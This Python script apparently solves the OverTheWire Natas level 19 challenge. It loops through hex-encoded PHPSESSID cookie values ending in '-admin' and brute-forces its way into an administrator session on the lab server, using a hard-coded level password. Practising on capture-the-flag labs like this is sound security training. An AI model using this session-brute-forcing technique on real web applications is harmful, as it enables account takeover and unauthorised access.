import requests
import time
#Function to stablish connection
def start_session(username,password,url):
    session = requests.Session()
    r = session.post(url,auth=(username, password))
    return session

if __name__ == '__main__':
    username = 'natas19'
    password = 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr'
    url = 'http://natas19.natas.labs.overthewire.org/'
    session = start_session(username,password,url)
    payload = {'debug':'True','username':'admin','password':'admin'}
    for i in range(0,10):
        print(f'intentando con la tupla ({i})')
        cookie = f'3{i}2d61646d696e'
        r=session.post(url,auth=(username,password),data=payload,cookies={'PHPSESSID':cookie})
        if 'You are an admin' in r.content.decode():
            print(r.content)
            exit(0) 
    for j in range(0,10):
        for k in range(0,10):
            print(f'intentando con la tupla ({k},{j})')
            cookie = f'3{k}3{j}2d61646d696e'
            r=session.post(url,auth=(username,password),data=payload,cookies={'PHPSESSID':cookie})
            if 'You are an admin' in r.content.decode():
                print(r.content)
                exit(0)
    for i in range(0,10):
        for j in range(0,10):
            for k in range(0,10):
                print(f'intentando con la tupla ({i},{k},{j})')
                cookie = f'3{i}3{k}3{j}2d61646d696e'
                r=session.post(url,auth=(username,password),data=payload,cookies={'PHPSESSID':cookie})
                if 'You are an admin' in r.content.decode():
                    print(r.content)
                    exit(0)

#36382d 61646d696e(admin)